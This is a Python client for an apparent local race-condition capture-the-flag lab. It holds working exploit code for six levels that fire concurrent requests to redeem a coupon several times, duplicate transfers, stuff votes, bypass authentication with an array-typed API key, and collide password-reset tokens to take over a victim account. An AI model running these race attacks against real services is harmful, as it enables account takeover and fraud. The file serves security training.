"""
race_client.py — a small helper for firing truly concurrent HTTP requests
at the lab, so you don't have to fight shell timing with `curl &`.

Usage examples:
    python race_client.py level1
    python race_client.py level2
    python race_client.py level3
    python race_client.py level4
    python race_client.py level5
    python race_client.py level6

Requires: pip install requests
"""

import sys
import time
import requests
from concurrent.futures import ThreadPoolExecutor

BASE = "http://127.0.0.1:5000"


def fire(n, fn):
    """Run fn() n times concurrently using a thread pool, return results."""
    with ThreadPoolExecutor(max_workers=n) as ex:
        futures = [ex.submit(fn, i) for i in range(n)]
        return [f.result() for f in futures]


def level1():
    requests.post(f"{BASE}/level1/reset")
    results = fire(8, lambda i: requests.post(f"{BASE}/level1/redeem").json())
    for r in results:
        print(r)
    print("Final state:", requests.get(f"{BASE}/level1").status_code, "-> check the page for the flag")


def level2():
    requests.post(f"{BASE}/level2/reset")
    results = fire(6, lambda i: requests.post(f"{BASE}/level2/transfer", data={"amount": 500}).json())
    for r in results:
        print(r)


def level3():
    requests.post(f"{BASE}/level3/reset")
    results = fire(8, lambda i: requests.post(f"{BASE}/level3/vote").json())
    for r in results:
        print(r)


def level4():
    requests.post(f"{BASE}/level4/reset")
    s = requests.Session()

    def register():
        return s.post(f"{BASE}/level4/register", data={"username": "bob"}).json()

    def try_auth():
        # small stagger so this fires while registration is still mid-sleep
        time.sleep(0.1)
        return requests.get(f"{BASE}/level4/api", params={"user": "bob", "api-key[]": ""}).json()

    with ThreadPoolExecutor(max_workers=2) as ex:
        f1 = ex.submit(register)
        f2 = ex.submit(try_auth)
        print("register:", f1.result())
        print("api call:", f2.result())


def level5(max_attempts=25):
    # Like the real-world technique this models, landing the exact interleaving
    # needed can take a few tries -- so we retry the whole race a few times
    # instead of asking for a single lucky shot.
    for attempt in range(1, max_attempts + 1):
        requests.post(f"{BASE}/level5/reset")
        s = requests.Session()  # ONE shared session/cookie jar for both requests
        s.get(f"{BASE}/level5/init")  # establish the shared session cookie BEFORE racing

        def request_reset(username):
            return s.post(f"{BASE}/level5/request_reset", data={"username": username}).json()

        with ThreadPoolExecutor(max_workers=2) as ex:
            f_victim = ex.submit(request_reset, "victim")
            f_attacker = ex.submit(request_reset, "attacker")
            f_victim.result()
            f_attacker.result()

        inbox = s.get(f"{BASE}/level5/inbox", params={"user": "attacker"}).json()
        token = inbox.get("token")
        if not token:
            continue
        confirm = s.post(f"{BASE}/level5/confirm", data={"token": token, "new_password": "pwned123"}).json()
        print(f"attempt {attempt}: {confirm}")
        if confirm.get("status") == "password changed" and confirm.get("changed_user") == "victim":
            print("Collision landed! Flag:", confirm.get("flag"))
            return
    print("No collision after", max_attempts, "attempts -- try running it again.")


def level6():
    requests.post(f"{BASE}/level6/reset")

    def redeem_fresh_session(i):
        # a NEW requests.Session() per call = no shared cookie = no shared lock
        return requests.post(f"{BASE}/level6/redeem").json()

    results = fire(6, redeem_fresh_session)
    for r in results:
        print(r)


LEVELS = {
    "level1": level1, "level2": level2, "level3": level3,
    "level4": level4, "level5": level5, "level6": level6,
}

if __name__ == "__main__":
    if len(sys.argv) != 2 or sys.argv[1] not in LEVELS:
        print(f"Usage: python race_client.py <{'|'.join(LEVELS)}>")
        sys.exit(1)
    LEVELS[sys.argv[1]]()
